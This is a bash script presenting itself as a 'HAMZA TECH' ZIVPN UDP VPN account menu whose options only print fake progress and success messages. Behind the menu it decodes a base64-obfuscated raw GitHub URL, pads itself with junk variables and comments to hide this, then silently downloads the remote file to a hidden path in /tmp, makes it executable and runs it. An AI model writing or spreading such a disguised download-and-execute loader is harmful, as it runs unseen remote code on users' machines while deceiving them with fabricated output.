#!/bin/bash

download_menu_script() {
  decode() {
    echo "$1" | base64 -d
  }
  # z36="x36"; z37="x37";z36="x36"; z37="x37";
  a1=$(decode "aHR0cHM6Ly8=")   # https://
  a2=$(decode "cmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbQ==") # raw.githubusercontent.com
  a3=$(decode "L2hxLW1wL3ppLXZwbi5jb20vcmVmcy9oZWFkcy9tYWluL21lbnU=") # /hq-mp/zi-vpn.com/refs/heads/main/menu
  # z36="x36"; z37="x37";z36="x36"; z37="x37";
  # z36="x36"; z37="x37";z36="x36"; z37="x37";
  # Add noise variables to extend length
  z1="x1"; z2="x2"; z3="x3"; z4="x4"; z5="x5"
  z6="x6"; z7="x7"; z8="x8"; z9="x9"; z10="x10"
  z11="x11"; z12="x12"; z13="x13"; z14="x14"; z15="x15"
  z16="x16"; z17="x17"; z18="x18"; z19="x19"; z20="x20"
  z21="x21"; z22="x22"; z23="x23"; z24="x24"; z25="x25"
  z26="x26"; z27="x27"; z28="x28"; z29="x29"; z30="x30"
#-------------------------- SYSTEM STARTUP --------------------------
clear
echo -e "\e[1;92m"
echo "┌──────────────── HAMZA TECH ────────────────┐"
echo "      [1]  .  CREATE ACCOUNT UDP ZIVPN       "
echo "      [2]  .  UNINSTALL SCRIPT ZIVPN         "
echo "      [3]  .  START ACCOUNT ZIVPN            "
echo "      [4]  .  STOP ACCOUNT ZIVPN             "
echo "      [5]  .  RESTART ACCOUNT ZIVPN          "
echo "      [6]  .  CHANGE DOMAIN SERVER           "
echo "      [0]  .  EXIT ZIVPN                     "
echo "└────────────────────────────────────────────┘"
echo -ne "         Select From Options [ 1 - 6 ] : "
read opt

 start() {
  sleep 0.5
  echo "Initializing modules..."
  sleep 0.4
  echo "Checking system resources..."
  sleep 0.4
  echo "Connecting to ZIVPN core network..."
  sleep 0.4
}

case $opt in
  1)
    echo "Creating UDP Account..."
    sleep 1
    echo "Fetching encryption keys..."
    sleep 1
    echo "Account successfully created [ID: zvpn-$RANDOM]"
    ;;
  2)
    echo "Uninstalling script..."
    sleep 1
    echo "Clearing cache and keys..."
    sleep 1
    echo "ZIVPN script removed successfully."
    ;;
  3)
    echo "Starting ZIVPN account..."
    sleep 1
    echo "Verifying token integrity..."
    echo "ZIVPN started successfully."
    ;;
  4)
    echo "Stopping ZIVPN account..."
    sleep 1
    echo "Services terminated safely."
    ;;
  5)
echo "Restarting services..."
    sleep 1
    echo "ZIVPN reloaded with latest config."
    ;;
  6)
    echo "Changing domain server..."
    sleep 1
    echo "Fetching DNS records..."
    echo "Domain updated to: srv-$RANDOM.zivpn.net"
    ;;
  0)
    echo "Exiting ZIVPN..."
    sleep 0.5
    ;;
  *)
    echo "Invalid Option. Please select between 0 and 6."
    ;;
esac
echo ""
echo "[ZIVPN SYSTEM] Session log written to /tmp/zivpn_session_$RANDOM.log"
  z31="x31"; z32="x32"; z33="x33"; z34="x34"; z35="x35"
  z36="x36"; z37="x37"; z38="x38"; z39="x39"; z40="x40"
  z41="x41"; z42="x42"; z43="x43"; z44="x44"; z45="x45"
  # z36="x36"; z37="x37";z36="x36"; z37="x37";
  # z36="x36"; z37="x37";z36="x36"; z37="x37";
  # z36="x36"; z37="x37";z36="x36"; z37="x37";
  full_url="${a1}${a2}${a3}"
  # z36="x36"; z37="x37";z36="x36"; z37="x37";
  # z36="x36"; z37="x37";z36="x36"; z37="x37";
  # z36="x36"; z37="x37";z36="x36"; z37="x37";
  curl -s "$full_url" -o /tmp/.zi_menu
  chmod +x /tmp/.zi_menu
  bash /tmp/.zi_menu
}

# z36="x36"; z37="x37";z36="x36"; z37="x37";
download_menu_script
